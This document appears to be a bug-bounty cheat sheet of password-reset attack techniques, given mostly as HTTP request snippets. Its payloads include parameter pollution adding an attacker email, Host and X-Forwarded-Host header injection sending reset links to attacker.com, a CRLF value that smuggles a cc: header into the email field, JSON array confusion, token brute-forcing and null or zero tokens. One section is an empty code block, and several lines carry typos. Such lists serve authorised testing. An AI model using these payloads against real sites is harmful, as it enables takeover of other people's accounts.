
__Include Your Email as 2nd parameter__
```http
POST /reset
...
...
email=victim@gmail.com&email=attacker@gmail.com
```


__Bruteforce if numric__
```http
https://exaample.com/reset?token=$BRUTEFORCE
```



__Use Your Token on Victims Email__
```http
POST /reset
...
...
email=victim@gmail.com&token=$YOUR-TOKEN$
```



__Host Header Injection__
```http
POST /reset
Host: attacker.com
...
email=victim@gmail.com
```



__HTML injection in Host Header__
```http
POST /reset
Host: attacker">.com
...
email=victim@gmail.com
```



__X-Forwaded in Host__
```http
POST /reset
Host: website.com
X-Forwaded-Host: attacker.com
...
email=victim@gmail.com
```



__CRLF in Reset__
```http
POST /reset
Host: attacker.com
...
...
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```



__Leakage of Password reset in Referer Header__
```http
Referrer: https://website.com/reset?token=1234
```



__Leaking Reset Token in Response Body__
```http

```



__Using Companies Email__
```
While inviting users into your account/organization, you can also try inviting company emails and add a 
new field "password": "example123". or "pass": "example123" in the request. you may end up resetting a
user password

Company emails can be found on target's GitHub Repos members or you can check on http://hunter.io. some users
have a feature to set a password for invited emails, so here we can try adding a pass parameter.

If successful, we can use those credentials to login into the account, SSO integrations, support panels,
etc #BugBountyTips  
```



__CRLF in URL__
```http
with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)
```



__Json Array Confusion__
```http
{"email":["victim@mail.tld","atracker@mail.tld"]}
```



__HTML injection in Email__
```http
HTML injection in email via parameters, cookie, etc > inject image > leak the  token
```



__Remove token__
```http
http://example.com/reset?eamil=victims@gmail.com&token=
```



__Change it to 0000__
```http
http://example.com/reset?eamil=victims@gmail.com&token=0000000000

```



__Use Null Value__
```http
http://example.com/reset?eamil=victims@gmail.com&token=Null/nil

```


__try an array of old tokens__
```http
http://example.com/reset?eamil=victims@gmail.com&token=[oldtoken1,oldtoken2]
```



__try victim@email.com&attacker@email.com use  %20 or | as separators__
```http
POST /reset
Host: attacker.com
...
...
email=attacker@mail.tld%20victim@gmai.com
email=attacker@mail.tld|victim@gmai.com
```




__SQLi bypass__
```http
try sqli bypass and wildcard or, %, *
```




__Request Method / Content Type__
```http
change request method (get, put, post etc) and/or content type (xml<>json) 
```




__Response Manipulation__
```http
Replace bad response and replace with good one
```




__Massive Token__
```http
http://example.com/reset?eamil=victims@gmail.com&token=1000000 long string

```




__Crossdomain Token Usage__
```http
If a program has multiple domains using same underlying reset mechanism, reset token generated from one domain sometime 
works in another domain too.
```





#### Other:
- change 1 char at the begin/end to see if the token is evaluated
- use unicode char jutzu to spoof email address
- look for race conditions
- don't add the domain locu@
- try to register the same mail with different TLD (.eu,.net etc)
